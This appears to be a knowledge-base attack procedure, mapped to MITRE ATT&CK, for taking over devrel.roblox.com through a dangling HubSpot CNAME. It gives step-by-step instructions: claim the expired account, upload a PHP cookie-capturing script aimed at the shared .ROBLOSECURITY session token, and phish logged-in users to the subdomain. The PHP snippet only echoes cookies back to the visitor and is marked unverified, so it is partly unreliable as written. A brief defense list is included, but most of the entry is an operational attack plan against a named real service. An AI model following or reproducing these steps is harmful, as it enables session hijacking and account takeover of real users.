---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - subdomain-takeover
  - cookie-theft
type: procedure
tools:
  - '[[tools/HubSpot]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/php-cookie-theft-script]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T04:39:02.015Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Steal Web Session Cookie]]'
---
# Claim Subdomain and Host Malicious Content

## Summary

This procedure claims control over a vulnerable subdomain by registering an expired third-party service account and hosting malicious PHP scripts to steal session cookies, exploiting shared domain cookie scopes for authentication bypass and account takeover.

## Description

Following discovery, the attacker claims the HubSpot instance linked to devrel.roblox.com's CNAME. They then upload a PHP script that enumerates and exfiltrates all cookies, including the .ROBLOSECURITY token shared across *.roblox.com subdomains. Victims visiting the subdomain while logged in unwittingly send their session data, enabling hijacking without further exploits.

## Requirements

1. Access to the unclaimed service dashboard (e.g., HubSpot signup)
2. Basic web development knowledge for scripting (PHP/JS)
3. Victim traffic to the subdomain (phish or lure users)

## Defense

Defensive measures and detection strategies:

- Scope cookies to specific subdomains (e.g., .roblox.com -> app.roblox.com only)
- Monitor for anomalous traffic or content changes on subdomains
- Implement HttpOnly and Secure flags on sensitive cookies; use short-lived tokens

## Objectives

1. Gain hosting control over the legitimate subdomain
2. Capture and exfiltrate session cookies from authenticated users
3. Achieve account takeover using stolen credentials

## Instructions

### Step 1: Claim the Service Account

**Context**: Register the expired HubSpot account to redirect the CNAME traffic to attacker control.

No specific command; manually sign up at hubspot.com with the dangling instance ID.

> Expected: Dashboard access confirming subdomain mapping.

### Step 2: Host Cookie Theft Script

**Context**: Upload PHP code via HubSpot's CMS to capture incoming cookies on page load.

**Command** ([[commands/php-cookie-theft-script]]):

```php
<?php echo "Cookies received: <br>"; foreach($_COOKIE as $key => $val) { echo "Set-Cookie: $key=$val; Domain=.roblox.com; path=/<br>\n"; } ?>
```

> This script iterates over $_COOKIE array and outputs values. Parameters: $_COOKIE (incoming browser cookies). Expected output: HTML listing cookies like .ROBLOSECURITY=token123. Collect via logs or email exfil.

### Step 3: Lure Victims

**Context**: Direct users to devrel.roblox.com (e.g., via phishing email claiming developer resources).

Test with a controlled browser session.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Steal Web Session Cookie]] Steal Web Session Cookie

### Sub-Techniques


## Commands Used

- [[commands/php-cookie-theft-script]]

## Tools Used

- [[tools/HubSpot]]

## Tags

- subdomain-takeover
- cookie-theft
